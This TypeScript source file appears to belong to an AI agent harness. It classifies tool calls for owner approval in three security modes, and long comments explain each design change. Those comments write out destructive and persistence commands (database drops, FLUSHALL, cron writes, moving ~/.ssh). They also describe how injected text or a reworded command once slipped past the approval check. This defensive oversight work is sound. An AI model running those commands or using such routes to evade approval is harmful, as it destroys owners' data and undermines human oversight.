 *  - Autonomous said "anything left behind to run after the turn is over". Driven, `crontab
 *    /tmp/mycron`, `systemctl enable`, `at` and a sudo write of a systemd unit all raise no card in
 *    any mode. The word doing the damage was "anything": what the floor actually holds is the file
 *    shapes it can name, so the clause now names them.
 *
 * AND THE THIRD, THIS WAVE. Autonomous said "agreeing to something on your behalf", and what the
 * floor held was `sign`, `accept offer`, `submit` and `confirm`: driven, "accept the terms", "agree
 * to the terms and conditions", "accept the licence", "I agree", "Accept all cookies" and "opt in"
 * raised no card in balanced or autonomous. That clause is now split rather than widened, because
 * the two halves of it are answerable by different amounts of evidence.
 *
 * The half that can be recognised is an agreeing VERB carrying the object of the agreement:
 * `accept`/`agree` within a few words of `terms`, `licence`, `license` or `eula` are now in
 * `consequentialText`, so accepting terms in the owner's name stops in every mode - and the
 * sentence says "signing or accepting terms in your name", which is exactly that and no more.
 *
 * THE VERB IS LOAD-BEARING and the four bare nouns were not what the sentence promised. Held on
 * their own for one wave, they carded the act of READING the document as reliably as the act of
 * accepting it, because `terms`, `licence` and `eula` name a document and every other word in this
 * list names an act. Driven over eight ordinary reading acts, in all three modes: clicking the
 * LICENSE link in a repository sidebar, opening an API terms page to find a rate limit, filtering a
 * package list to MIT, and reading a library's licence all raised
 * `external_consequential` - four of five, and the desktop installer's "View licence" control with
 * them - against nought at `cd7033f`. Every one of those is friction on ordinary work, which is the
 * thing the owner's rule rejects by name, and none of it was promised by any sentence. Paired, the
 * six controls the runner asserts and the three acts the sentence test drives all still card, and
 * all eight reads are free again.
 *
 * The half that cannot is consent as a category. `classifyBrowserAction` has one structural rule -
 * a submit control inside a form - and a cookie banner's "Accept all" is a plain button outside any
 * form, indistinguishable from every other button by the evidence a click carries. So consent can
 * only ever be a phrase list over button copy, that list rots in one direction ("Got it", "Alle
 * akzeptieren") and fires on ordinary reading in the other, since a banner stands in front of
 * almost every page a research turn opens. A promise the floor cannot keep is worse than a missing
 * promise, so the sentence stops making it. Written up in docs/design/gaps/NETWORK.md.
 *
 * AND THE FOURTH, THIS WAVE, and it is the only one of the four that was widened rather than
 * narrowed - because unlike consent, the evidence was there and nothing was reading it.
 *
 * Autonomous said "destroying data". Driven through this function at 89185c6, in balanced AND
 * autonomous: `dropdb production`, `psql -c "DROP DATABASE production"`,
 * `psql -c "TRUNCATE TABLE users"`, `mysql -e "DROP DATABASE app"`, `redis-cli FLUSHALL`,
 * `redis-cli FLUSHDB`, `mongosh --eval "db.dropDatabase()"`, `sqlite3 app.db "DROP TABLE users"`,
 * `docker volume rm pgdata`, `docker system prune -af --volumes`, `s3cmd del --recursive`,
 * `az storage blob delete-batch` and `gsutil` and `aws` deletes that carded only because the
 * address happened to parse - ALL of them free. The clause was true of files and of nothing else,
 * while `rm -rf node_modules`, which is inside the workspace and which a rewind puts straight back,
 * stopped the turn in all three modes. `destructionOperation` is that clause's branch, and the
 * sentence is unchanged because the words were never wrong: the code was.
 *
 * The persistence clause is the half that DID move. It said "a startup file, hook or tool
 * configuration", which is a list of files, and `crontab -`, `crontab /tmp/mycron`, `crontab -r`,
 * `at -f job.sh now`, `systemctl --user enable`, `systemctl enable` and `launchctl load` name no
 * file at all - all seven free in balanced and autonomous. Two words rather than a category:
 * "schedule, service" now sit in the list beside the file shapes, and both are held by acts in
 * `approval-policy.test.ts` below.
 *
 * WHAT DECIDED WHAT IS ABSENT, and it is the reason this wave is not simply a longer list.
 * `CHECKPOINT_CONTENT` is `['workspace', '.athanor/artifacts']`, so a rewind is a real answer for
 * anything inside it and no answer at all for anything outside. Every operation the new branch
 * names is outside. Package-manager cache clears, `cargo clean`, `git branch -D`, `git reflog
 * expire` and `git gc --prune=now` are not: a cache re-fetches, `target/` and `.git` are under
 * `workspace/`, and carding them would be friction with a rewind already standing behind it. The
 * one git act that leaves the checkpoint's reach is the forced push, and that raised a card headed
 * "Push Git changes" under `external_reversible` - the right stop under the wrong sentence, now
 * `forcedGitPush` and a card that says what a forced push does. Counted, and the residue named, in
 * docs/design/itself/DESTRUCTION.md.
 *
 * AND THE HALF OF "DESTROYING DATA" THE CODE HAD BACKWARDS, this wave. The sentence's first four
 * words are the whole rule - "Only what this computer cannot take back for you" - and the branch
 * under it asked what a command was CALLED and never where it pointed. Measured through this
 * function at bfbbd00, in autonomous: `rm -rf dist`, `rm workspace/tmp.log`, `rmdir build`,
 * `truncate -s 0 server.log` and `find workspace/downloads -name '*.tmp' -delete` all stopped the
 * turn, and this computer takes every one of them back by itself - they are strictly inside
 * `CHECKPOINT_CONTENT` and the turn's own undo point already holds them. So the sentence is
 * unchanged here too, for the second time in this comment and for the opposite reason: the words
 * were right and the code was reading only half of them. `destructiveCommand` now resolves where a
 * delete lands, and `insideCheckpointContent` is where the resolution and its three refusals live.
 * The counterweight is in `evals/cards/guards.ts`, because a location test that widens into an
 * exemption for the word `rm` makes every count in that rig fall at once and reads like a saving.
 *
 * WHAT THAT DID NOT REACH, said plainly rather than implied. The git arms beside it - `clean -f`,
 * `reset --hard`, `checkout --` and a `restore` that rewrites a file - throw away uncommitted work
 * inside `workspace/`, which is inside the undo point, and they keep their cards. They are not
 * resolved by the same test because what they discard is not a path either of them names, and
 * nothing has measured what dropping them would cost or save. It is a residue, not a decision.
 *
 * WHAT IS STILL DELIBERATELY LEFT ALONE. "Publishing" is a category name and carries the gaps its
 * category has. It reaches `vercel --prod`, `flyctl deploy` and `kubectl apply` now, through
 * `deploymentOperation`'s tables and the walk in `publishingOperation` - the sentence was written
 * when it reached none of them - but a table is a list and a list is not a bound, so the category
 * still misses what the command's text does not name: `make deploy`, `npm run deploy`,
 * `lerna publish` and the deployment CLIs nobody has written down yet. Counted and named in
 * docs/design/gaps/GATE.md; the sentence deliberately does not promise them.
 */
export const SECURITY_MODE_FLOOR: Record<
  SecurityMode,
  {
    /** Review only: a card in front of every command, file write and browser or desktop action. */
    readonly asksBeforeEveryChange: boolean;
    /** Whether a command that reaches an address outside this computer is asked about at all. */
    readonly asksBeforeReachingTheInternet: boolean;
    /** Whether adding software to this computer is asked about. Removing it always is. */
    readonly asksBeforeInstallingSoftware: boolean;
    /** The whole of what this mode stops for, in the owner's language. */
    readonly sentence: string;
  }
> = {
  review: {
    asksBeforeEveryChange: true,
    asksBeforeReachingTheInternet: true,
    asksBeforeInstallingSoftware: true,
    sentence:
      'Every command, every file written, and every browser or desktop action, on top of everything Balanced asks about.'
  },
  balanced: {
    asksBeforeEveryChange: false,
    asksBeforeReachingTheInternet: true,
    asksBeforeInstallingSoftware: true,
    sentence:
      'Reaching an address out on the internet, and installing software onto it, on top of everything Autonomous asks about.'
  },
  autonomous: {
    asksBeforeEveryChange: false,
    asksBeforeReachingTheInternet: false,
    asksBeforeInstallingSoftware: false,
    sentence:
      'Only what this computer cannot take back for you — publishing, sending, spending, destroying data, signing or accepting terms in your name, a startup file, hook, schedule, service or tool configuration it would run on its own afterwards, and a control on a screen that nothing could identify.'
  }
};

export const approvalRequirement = (
  name: string,
  args: Record<string, unknown>,
  securityMode: SecurityMode = 'balanced',
  context: ApprovalContext = {}
): ApprovalRequirement | null => {
  const taintSources = context.taintSources ?? [];
  return strongestRequirement(
    taintSources.length ? taintedRequirement(name, args, context, taintSources) : null,
    strongestRequirement(
      serviceRequirement(name, args, taintSources),
      ordinaryRequirement(name, args, securityMode, context)
    )
  );
};

/**
 * The same vocabulary the two runner classifiers hold, read against what the model SAYS it is doing
 * rather than against the control it will touch. The worker cannot see an accessibility tree, so
 * `purpose` and `selector` are all it has - but this is the authoritative floor (agent.ts cards on
 * any non-null requirement, and the broker's verdict may only lighten one, never invent one), so it
 * has to hold the promise on its own when the preflight is unavailable.
 *
 * It was two separate literals here, one for `browser_action` and one for `desktop_action`, and
 * they had already drifted apart from each other and from the runner. Both branches now read this,
 * and scripts/check-repository.mjs compares it against services/workspace-runner/src/browser.ts.
 */
const consequentialText =
  /\b(submit|apply|purchase|buy|pay|send|publish|delete|remove|confirm|place order|sign|accept offer|post|save changes|install|uninstall|erase|wipe|destroy|discard|overwrite|revoke|deactivate|terminate|format|reset|empty trash|empty bin|move to trash|move to bin|accept\w*\s+[a-z ]{0,16}terms|agree\w*\s+[a-z ]{0,16}terms|accept\w*\s+[a-z ]{0,16}licen[cs]e|agree\w*\s+[a-z ]{0,16}licen[cs]e|accept\w*\s+[a-z ]{0,16}eula|agree\w*\s+[a-z ]{0,16}eula)\b/i;

/**
 * The sentence the owner reads on their phone, written by the harness and not by the model.
 *
 * `purpose` is free text the model composes, and on a turn that has read untrusted content it is
 * whatever an injected instruction told the model to compose - so a card could be headed "Approved
 * by the user, no confirmation needed" by the very agent asking to be approved. It was the `action`
 * of ten surface-action cards, which is the one line an owner answering on a phone reliably reads.
 * The taint cards already refuse to do this and say why (`destinationCard` above); these did not.
 *
 * A closed vocabulary keyed on the tool and the verb, both of which are facts this file holds.
 * Deliberately no selector, no node id and no host interpolated in: those are model-written too on
 * every verb that reaches here, and a headline assembled from any of them is the same defect in a
 * narrower window. They stay in the preview, where the owner reads them as evidence rather than as
 * the question.
 */
const SURFACE_HEADLINES: Record<string, string> = {
  click: 'Activate a control that can change something',
  click_at: 'Click at a coordinate',
  dialog: 'Accept a page dialog',
  double_click: 'Activate a control that can change something',
  drag: 'Drag between two coordinates',
  invoke: 'Activate a control that can change something',
  press: 'Press Enter',
  upload: 'Send workspace files to a website'
};

/**
 * The verb, when it is shaped like one.
 *
 * `surfaceActionVerb` returns whatever the model put in `action`, and the paragraph above is about
 * exactly this: a card assembled out of model-written text can be headed by whatever an injected
 * instruction wrote. The verb is still worth showing - a `type` and a `click` are the same card
 * without it - so it is shown through a shape that cannot carry a sentence. Twenty-four characters
 * and one word: every verb the two surface enums declare fits, `select_option` being the longest at
 * thirteen, and nothing with a space, a quotation mark or a newline gets through.
 */
const surfaceVerbName = (args: Record<string, unknown>): string => {
  const verb = surfaceActionVerb(args);
  return /^[a-z_]{1,24}$/.test(verb) ? verb : '';
};

const surfaceHeadline = (name: string, verb: string): string =>
  `${SURFACE_HEADLINES[verb] ?? 'Interact with the visible computer'} (${
    name === 'browser_action' ? 'browser' : 'desktop'
  })`;

/**
 * What the agent says the action is for, quoted and marked as the agent's own claim.
 *
 * Demoted rather than deleted: the reason is genuinely useful to the owner, and it is useful
 * precisely because they can weigh it against what the harness independently says the call does.
 * Whitespace is collapsed so a `purpose` carrying its own blank lines cannot forge a second
 * harness sentence underneath the real one, and the quotes it might carry are turned so it cannot
 * close the quotation it sits in.
 */
const statedReason = (purpose: unknown): string => {
  const text = textValue(purpose).replace(/\s+/g, ' ').replace(/"/g, "'").trim().slice(0, 300);
  return text ? `The agent states its reason as: "${text}"` : 'The agent stated no reason.';
};

/** One headline for every way a call can leave code behind for a later process to run. */
const DEFERRED_EXECUTION_ACTION = 'Change a file this computer runs on its own';

/**
 * How many of the things a call touches a card names before it stops listing them.
 *
 * Six, which is what the deferred-execution card below already showed, because two conventions for
 * one job is how a card surface stops being readable. It is a bound on the LIST and not on the
 * FACT: `namedObjects` counts what it did not show in the same sentence, which is the half that was
 * missing. A card that names six of forty paths and says nothing about the other thirty-four is
 * worse than one that names none, because the owner approves believing they have seen the reach.
 *
 * Measured against the shape that has to fit: `file_patch` takes up to forty patches in one call
 * (tool-catalogue.ts, `maxItems: 40`), and forty patches are rarely forty files - hunks cluster.
 * Distinct paths are what is counted for that reason: eleven edits to one file are one file to the
 * person approving them.
 */
const CARD_NAMED_OBJECTS = 6;

const namedObjects = (values: readonly string[]): string => {
  const distinct = [...new Set(values.filter(Boolean))];
  const hidden = distinct.length - CARD_NAMED_OBJECTS;
  const shown = distinct.slice(0, CARD_NAMED_OBJECTS).join(', ');
  return hidden > 0 ? `${shown} and ${hidden} more` : shown;
};

/**
 * How much of a command a card prints.
 *
 * The card is answered on a phone, and `shell` takes an arbitrarily long inline script: a two
 * hundred line `python3 -c` is a preview nobody reads to the end of, which is the same defect as an
 * unnamed path wearing the opposite shape. Four hundred characters is about six lines on a phone
 * and covers every real invocation in this repository's own tests; what is cut is counted rather
 * than trailed off, for the reason `namedObjects` gives.
 */
const CARD_COMMAND_CHARS = 400;

/**
 * What the owner would see run, wherever the model wrote it down.
 *
 * `[executable, ...args]` alone printed "Run bash" for the whole `stdin` form - a card describing a
 * command it did not show, which is the one thing a card must not do. That was fixed inside the
 * destructive-command branch and nowhere else, so Review mode, which is the mode whose entire
 * promise is that the owner sees each command before it runs, went on printing "Run bash" for every
 * script handed over on stdin. One reader, so the two cannot say different things about one call.
 */
const shellInvocation = (args: Record<string, unknown>): string => {
  const invocation = [
    [
      textValue(args.executable).split('/').pop() ?? '',
      ...(Array.isArray(args.args) ? args.args.map(String) : [])
    ]
      .filter(Boolean)
      .join(' '),
    ...(textValue(args.stdin) ? [textValue(args.stdin)] : [])
  ]
    .filter(Boolean)
    .join(' << ');
  return invocation.length > CARD_COMMAND_CHARS
    ? `${invocation.slice(0, CARD_COMMAND_CHARS)}… and ${invocation.length - CARD_COMMAND_CHARS} more characters`
    : invocation;
};

const ordinaryRequirement = (
  name: string,
  args: Record<string, unknown>,
  securityMode: SecurityMode,
  context: ApprovalContext
): ApprovalRequirement | null => {
  /*
   * A write that runs later, outside every approval, checked before anything else this function
   * asks.
   *
   * The agent's HOME is `.home` at the container root, beside `workspace/` and not inside it
   * (execution.ts), and the subscription coding CLIs run from it, so
   * `~/.bashrc`, `~/.gitconfig`, `.git/hooks/pre-commit` and a CLI's own configuration are not
   * files the agent wrote - they are code a longer-lived and more privileged process will execute
   * on its own schedule, after this task and every card in it is over. Nothing in this floor named
   * any of them in any security mode. The one rule that came close, the durable-instruction rule
   * over the brief and the workspace skills, fires only while the turn is already tainted, which is
   * the wrong condition for this: deferred execution is deferred execution whether or not anything
   * hostile has been read yet, and the write is the last moment anybody can be asked.
   *
   * First, ahead of the destructive-command rule, because it is the more specific statement about
   * the call and both stop the turn either way.
   *
   * This used to say the over-inclusion on `shell` was cheap because an agent doing ordinary work
   * has no reason to name these paths, so the false positives would be rare. They were constant:
   * `writtenPaths` handed this every token in the script, and an owner asking why their PATH is
   * wrong gets `cat ~/.bashrc`, `grep -n PATH ~/.zshrc`, `test -f ~/.profile` and `head .git/config`
   * in a row - seven cards in nine calls, six of them on commands that changed nothing, all under
   * this headline. `writtenPaths` now resolves the write targets and falls back to the wide net only
   * where it cannot read the script, so what arrives here is over-inclusive where that is all
   * anybody can be and precise everywhere else.
   *
   * KEPT WHERE IT BITES AND DROPPED WHERE IT CANNOT. `shell` is not path-confined and `~/.bashrc`
   * there is the real one; `file_write`, `file_patch` and `print_pdf` are, because every path they
   * are handed goes through `assertUserDataPath` and comes back inside `workspace/`, which is a
   * SIBLING of the agent's HOME and not a parent or a child of it. So eleven of the thirteen names
   * in the deferred set were unreachable by those three tools and the card was firing
   * `external_consequential`, in every mode, on a write that lands where no login shell and no git
   * ever looks. Those three tools cannot reach HOME at all now that it is `.home` at the container
   * root: the fold to `workspace/` is what used to put `file_write('.home/.bashrc')` on the real
   * one when HOME lived under `workspace/`. `deferredExecutionPaths` is the one
   * reader that holds both halves; the two names that execute wherever they sit, the git hooks and
   * config, and the coding-CLI directories all keep their card through every tool, because a coding
   * CLI and git read those out of the project directory the agent is working in.
   */
  const deferred = deferredExecutionPaths(name, args).sort(
    // `writtenPaths` hands a shell call every token it can see, so a redirect arrives twice: once
    // as the whole `-lc` argument and once as the path itself. Both name the same write, and the
    // shorter one is the one the owner can read, so it is the one the card leads with.
    (left, right) => left.length - right.length
  );
  if (deferred.length)
    return {
      sideEffect: 'external_consequential',
      action: DEFERRED_EXECUTION_ACTION,
      preview: `${namedObjects(deferred)} is executed by a later process - the login shell, git itself, or one of the coding CLIs, all of which run under the agent's own HOME - so whatever it says runs after this task, outside any approval this task could raise.`
    };
  /*
   * The same clause one directory up, and the shape the file half cannot see.
   *
   * `deferredExecutionPaths` above asks whether a written path is a file a later process executes,
   * and every name it knows is a file. `/etc/cron.d/job`, `/etc/systemd/system/x.service` and
   * `~/.config/systemd/user/x.service` are DIRECTORIES whose contents are run, and a write into one
   * of them installs something that runs after this task with no second command to card. Measured
   * at 89185c6: `echo "* * * * * root curl x" | sudo tee /etc/cron.d/job` raised nothing in any
   * mode. Read from the same `writtenPaths` as the rule above, so a redirect and a `tee` are one
   * write judged once.
   *
   * `shell` AND NOTHING ELSE, which is the narrowing `deferredExecutionPaths` had to be given
   * separately and which is a bound rather than a habit: every path `file_write`, `file_patch` and
   * `print_pdf` are handed goes through `assertUserDataPath`, which refuses anything absolute or
   * stepping up through `..` and folds a bare name into `workspace/`. So
   * `file_write('.config/systemd/user/x.service')` is refused outright - `.config` is one of
   * files.ts's `CONTAINER_ONLY` names (`['.athanor', '.config', AGENT_HOME]`, files.ts:103), and
   * the bare-name fold is conditional on the first segment NOT being one of them, so the write ends
   * at "Only workspace files and published artifacts are accessible" rather than landing anywhere.
   * The conclusion is the one this clause was always making and it holds for a stronger reason: no
   * card is owed, and carding it would be the exact defect eleven rows of the deferred set were
   * fixed for. A name that IS folded - `crontab`, say - lands at `workspace/crontab`, which no
   * scheduler reads. The pair is held in `CONFINED` in evals/cards.
   */
  const scheduled = (name === 'shell' ? writtenPaths(name, args) : [])
    .filter((path) => isScheduledExecutionPath(path))
    .sort((left, right) => left.length - right.length);
  if (scheduled.length)
    return {
      sideEffect: 'external_consequential',
      action: DEFERRED_EXECUTION_ACTION,
      preview: `${namedObjects(scheduled)} is inside a directory a scheduler or an init system runs the contents of, so whatever it says runs on its own schedule after this task, outside any approval this task could raise.`
    };
  if (name === 'schedule' && textValue(args.action) !== 'list')
    return {
      sideEffect: 'external_reversible',
      action: `${textValue(args.action, 'Change')} scheduled work`,
      preview:
        textValue(args.action) === 'create'
          ? `${textValue(args.title, 'Scheduled task')}\n${textValue(args.prompt).slice(0, 1_500)}\n${JSON.stringify(args.spec ?? {})}`
          : `${textValue(args.action)} schedule ${textValue(args.id, 'unknown')}`
    };
  if (name === 'memory') {
    const reason = memoryApprovalReason(args, new Date(), context.taintSources ?? []);
    if (reason)
      return {
        sideEffect: 'workspace_write',
        // Only `add` reads the caller's `target`. `replace` and `remove` resolve the entry by id
        // and obey the stored record's own target (agent.ts, the memory case), so the card was
        // printing an argument nothing downstream honoured: replace{target:'user', id:<a
        // workspace id>} headed the card "Review long-term user memory" and then rewrote a
        // workspace entry. The scope is named where the argument is the one that decides it, and
        // nowhere else; naming the resolved record's own scope would take a lookup this function
        // has no store to make.
        action: `Review long-term ${['replace', 'remove'].includes(textValue(args.action)) ? '' : `${textValue(args.target, 'workspace')} `}memory`,
        preview:
          textValue(args.action) === 'remove'
            ? `Remove memory entry ${textValue(args.id, 'unknown')}.\n\n${reason}`
            : `${textValue(args.action) === 'replace' ? 'Replace with' : 'Save'}:\n${textValue(args.content).slice(0, 2_000)}\n\n${reason}`
      };
    return null;
  }
  if (name === 'skill' && ['upsert', 'remove'].includes(textValue(args.action))) {
    if (textValue(args.action) === 'remove')
      return {
        sideEffect: 'workspace_write',
        action: `Review reusable skill ${textValue(args.id, 'change')}`,
        preview: `Remove skill ${textValue(args.id, 'unknown')}.`
      };
    return {
      sideEffect: 'workspace_write',
      action: skillUpsertAction(
        textValue(args.name, textValue(args.id, 'change')),
        context?.existingSkill
      ),
      preview: skillUpsertPreview(
        textValue(args.name),
        textValue(args.description),
        textValue(args.content),
        context?.existingSkill
      )
    };
  }
  if (name === 'generate_media') {
    // Priced here rather than read out of the call. The estimate used to be a tool parameter, so a
    // model that wrote 0 - or omitted it, which arrived as NaN and failed every comparison - spent
    // the owner's provider money with no card in front of it.
    const model = context.mediaModel;
    const estimateUsd = mediaEstimateUsd({
      kind: textValue(args.kind),
      width: args.width,
      height: args.height,
      characterCount: textValue(args.prompt).trim().length,
      ...(model ? { model } : {})
    });
    const committedUsd = Math.max(0, Number(context.mediaCommittedUsd) || 0);
    // An unpublished price is not a small one. The owner is free to choose a route their provider
    // prices nowhere athanor can read, and the honest consequence of that choice is a card in front
    // of every generation on it rather than a threshold applied to a number nobody stated.
    const unpriced = model !== undefined && !model.priceKnown;
    if (unpriced || committedUsd + estimateUsd >= MEDIA_APPROVAL_USD)
      return {
        sideEffect: 'external_reversible',
        action: 'Approve continued provider spend on generated media',
        preview: `Generate ${textValue(args.kind, 'media')}${model ? ` with ${model.displayName}` : ''} ${unpriced ? 'from the connected provider account. This model publishes no price athanor can read, so the cost is only known once the provider bills it.' : `for about $${estimateUsd.toFixed(3)} from the connected provider account.`}${committedUsd > 0 ? ` This task has already spent about $${committedUsd.toFixed(2)} generating media.` : ''}\n\nEvery further generation in this task asks again.`
      };
  }
  if (name === 'audio_read') {
    // Priced on duration, because that is the unit transcription is billed in. The window is what
    // the call asks for rather than what the file turns out to hold, so this can only ever overstate
    // - which is the right direction for a card, and is why it says "up to".
    const model = context.mediaModel;
    const start = Math.max(0, Number(args.startSeconds) || 0);
    const end = Number(args.endSeconds);
    const seconds = Math.min(
      AUDIO_READ_MAX_SECONDS,
      Number.isFinite(end) && end > start ? end - start : AUDIO_READ_MAX_SECONDS
    );
    const estimateUsd = transcriptionEstimateUsd(seconds, model ?? null);
    const committedUsd = Math.max(0, Number(context.mediaCommittedUsd) || 0);
    // No route resolved is the same case as a route nobody priced: the owner has not chosen one, so
    // the model is whatever the provider offers and its price is not a number athanor can state.
    const unpriced = model === undefined || !model.priceKnown;
    if (unpriced || committedUsd + estimateUsd >= MEDIA_APPROVAL_USD)
      return {
        sideEffect: 'external_reversible',
        action: 'Approve continued provider spend on reading recordings',
        preview: `Read up to ${Math.ceil(seconds / 60)} minutes of ${textValue(args.path, 'a recording')}${model ? ` with ${model.displayName}` : ''}. ${unpriced ? 'Transcription is billed by the minute and no price athanor can read is published for this route, so the cost is only known once the provider bills it.' : `That is about $${estimateUsd.toFixed(3)} from the connected provider account.`}${committedUsd > 0 ? ` This task has already spent about $${committedUsd.toFixed(2)} on media.` : ''}\n\nEvery further reading in this task asks again.`
      };
  }
  if (name === 'coding_agent' && textValue(args.action) === 'setup')
    return {
      sideEffect: 'external_reversible',
      action: `Install ${codingAgentName(args.agent)}`,
      preview:
        'Download the publisher’s current official CLI package into this private agent computer. The upstream software and service terms apply.'
    };
  if (name === 'coding_agent' && textValue(args.action) === 'run')
    return {
      sideEffect: 'external_reversible',
      action: `Delegate repository work to ${codingAgentName(args.agent)}`,
      preview: `${textValue(args.prompt).slice(0, 2_000)}\n\nThe selected subscription service can inspect and modify files inside this agent computer. athanor keeps the process inside the workspace and records its bounded result.`
    };
  /*
   * `code_diagnostics` is deliberately absent from this file, and this note is here so the next
   * audit reads the decision rather than rediscovering the hole.
   *
   * A branch was added here in the previous wave, on the finding that nine of its fifteen languages
   * run the project's own build or test recipe. The finding is true and the instrument was wrong
   * three measured ways.
   *
   * It asked about a shape the owner can reach unasked one line over. The same nine recipes through
   * `shell` - `make -s`, `cargo check`, `go test ./...`, `bash ./gradlew build` - raise no card in
   * balanced or autonomous, because none of them removes data, reaches a network or leaves the
   * workspace. A card that a rephrasing walks around is not a floor; it is a toll on the phrasing.
   *
   * It cost the owner's own project a card on their own code. `npm install` makes every project's
   * dependency tree foreign and the build then runs it, so a ledger honest enough to call
   * `node_modules` a stranger's would card every build there is. Running someone else's code is the
   * job here, not the exception, and the tool that does it is not the place to relitigate that.
   *
   * And it claimed a property the same repository had already measured false: the tool sat on
   * `CHECKPOINT_EXEMPT_TOOLS`, which says it leaves nothing to undo, while `make -s` and
   * `cargo check` were recorded writing files. So a turn of nothing but diagnostics took no undo
   * point at all. That is the repair, and it is a bound rather than a question: `turn-bounds.ts`
   * now takes the undo point for every `code_diagnostics` call, in every language and every mode,
   * whoever wrote the repository. What a card would have asked, a checkpoint answers.
   *
   * What is left uncovered is written down rather than papered over, in
   * `docs/design/floor/DIAGNOSTICS.md`: a build recipe still runs as the agent identity, and the
   * sandbox around it is an identity boundary rather than a filesystem one.
   */
  /**
   * A command that can remove or overwrite data, whichever tool was used to start it.
   *
   * Shared with desktop_launch, which spawns a program directly. The runner already refuses to
   * start a privilege escalation or a package manager that way - the comment there says the point
   * is that "the same command the shell refuses runs unchecked simply by asking for a window" -
   * but only those two classes were covered, so `desktop_launch bash -c 'rm -rf workspace'` went
   * through with no card at all outside review mode. The window is not what makes a command safe.
   */
  const destructiveCommand = (
    executable: string,
    commandArgs: string[],
    // True when an earlier command on the same line moved the working directory, which is only ever
    // known by the caller that decomposed the line. See the location test at the foot of this
    // function: a re-based relative path is not the path this function would resolve.
    rebased = false
  ): { action: string; preview: string } | null => {
    const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
    const gitCommand = executable === 'git' ? gitSubcommand(commandArgs) : null;
    /*
     * `git restore` covers two acts and only one of them touches a file.
     *
     * `git restore --staged src/a.ts` unstages: the index moves and the file on disk is neither
     * read nor written, so the card in front of it - `external_consequential`, in every mode, under
     * a preview reading "This can remove or overwrite data" - was asking the owner to approve a
     * delete that could not happen. `git restore src/a.ts` and `git restore --staged --worktree
     * src/a.ts` both overwrite the working file from the index and both keep their card. That is
     * the same flag narrowing `clean` and `reset` two lines up already had and this arm did not.
     *
     * The short forms are compared RAW, for the reason the curl option sets in
     * command-classification.ts give: `-S` is `--staged` and `-s` is `--source`, so a lowercased
     * comparison would read `git restore -s HEAD~1 src/a.ts` - which does rewrite the file - as an
     * unstage. A bundled `-SW` is not read and falls to the carding side.
     */
    const unstageOnly =
      commandArgs.some((argument) => argument === '--staged' || argument === '-S') &&
      !commandArgs.some((argument) => argument === '--worktree' || argument === '-W');
    const gitDestructive =
      (gitCommand === 'clean' && lowerArgs.some((argument) => /^-[a-z]*f/.test(argument))) ||
      (gitCommand === 'reset' && lowerArgs.includes('--hard')) ||
      (gitCommand === 'restore' && !unstageOnly) ||
      (gitCommand === 'checkout' && lowerArgs.includes('--')) ||
      // A whole second checkout and everything uncommitted in it, which is the largest thing any
      // git subcommand deletes. It was documented and uncarded: `worktree` is in
      // `WRITING_GIT_SUBCOMMANDS` with a comment naming this exact destruction, and nothing in this
      // vocabulary read it. Narrowed to the verb like the three arms above - `git worktree list`,
      // `add`, `lock` and `prune` remove no checkout and stay free - and routed through the same
      // location test below, so a worktree the agent made under `workspace/` costs nothing.
      (executable === 'git' && gitRemovesAWorktree(commandArgs));
    const findDelete = executable === 'find' && lowerArgs.includes('-delete');
    const rsyncDelete = executable === 'rsync' && lowerArgs.includes('--delete');
    // A command that runs another one is judged by what it runs. `find . -exec rm -rf {} +` and
    // `xargs rm` do exactly what `rm` does, and both went through untouched while the plain form
    // stopped the task - so the classification rewarded whichever phrasing the model happened to
    // reach for rather than describing the effect.
    const wrapped =
      (COMMAND_RUNNERS.has(executable) ||
        (executable === 'find' &&
          lowerArgs.some((argument) => ['-exec', '-execdir', '-ok'].includes(argument)))) &&
      commandArgs.some((argument) => {
        const name = argument.split('/').pop() ?? '';
        return (
          consequentialExecutables.has(name) ||
          // `find . -exec mv {} /tmp/x \;` empties every path it finds, and `removalTargets` cannot
          // place any of them - the same answer this arm already gives `find . -exec rm`. Read here
          // and NOT in `mayRemoveSomething`'s token scan, which sees every word of a script: adding
          // it there would have carded `bash -lc 'rm -rf dist && git commit -m "mv the old files"'`
          // on the word inside the commit message, and `git` is not a runner this arm looks at.
          //
          // IT COSTS A CARD ON A WRAPPED MOVE THAT LANDS INSIDE THE WORKSPACE. Measured after the
          // change: `sudo mv dist dist.old`, `timeout 5 mv a b` and
          // `find . -name '*.tmp' -exec mv {} old/ \;` were free before it and card now. That is
          // the standing cost `sudo rm -rf dist` has carried since the wave before - a path behind
          // a wrapper is a path this file cannot place - and DESTRUCTION.md lists it as a card that
          // fires on work destroying nothing rather than leaving it to be rediscovered.
          RELOCATING_EXECUTABLES.has(name) ||
          name.startsWith('mkfs')
        );
      });
    const packageRemoval =
      packageRemovalExecutables.has(executable) &&
      lowerArgs.some((argument) => packageRemovalCommands.has(argument));
    const destructiveScript =
      commandInterpreters.has(executable) && isDestructiveScript(commandScript(args));
    /*
     * A signal to PID 1 is the `shutdown` family arriving by another spelling, and it is here
     * because `kill`, `killall` and `pkill` have left `consequentialExecutables`. It is its own
     * card rather than a membership, because it is decided by the target and not by the program -
     * `kill -0 1234` and `kill -9 1` are the same executable and are not the same act - and it says
     * what it does rather than borrowing the removal preview, which was false of all three names.
     */
    if (signalStopsThisComputer(executable, commandArgs))
      return {
        action: `Stop this computer with ${executable}`,
        preview: `Run ${[executable, ...commandArgs].join(' ')}. PID 1 is this computer's init process and -1 is every process on it: signalling either ends everything running here, this turn included, and nothing on this computer starts it again.`
      };
    /*
     * A move is a delete of the place it moves from, and it was the largest hole three verifiers in
     * a row have named without closing. Measured through this function at 59d3e67 in AUTONOMOUS
     * with `{ undoPoint: { id: 'cp-1', uncovered: [] } }`: `mv ~/.ssh /tmp/x` raised NOTHING, and so
     * did `mv -t /tmp/x ~/.ssh` and `bash -lc 'mv ~/.ssh /tmp/x'` - the agent's own keys out of
     * reach of everything that looks for them, with no byte deleted and no card shown.
     *
     * It is not a membership of `consequentialExecutables` and that is the measured part. `mv` is
     * ordinary work several times an hour, so it goes through the location rule below exactly as
     * `rm` does: `removalTargets` resolves its SOURCE operands, `mv dist old` inside `workspace/` is
     * free because the rewind holds the source, and a move whose source is anywhere else is not.
     * @see `RELOCATING_EXECUTABLES` for the argument shapes and for what it does not ask.
     */
    const relocation = RELOCATING_EXECUTABLES.has(executable);
    if (
      !(
        consequentialExecutables.has(executable) ||
        executable.startsWith('mkfs') ||
        relocation ||
        gitDestructive ||
        findDelete ||
        rsyncDelete ||
        wrapped ||
        packageRemoval ||
        destructiveScript
      )
    )
      return null;
    /*
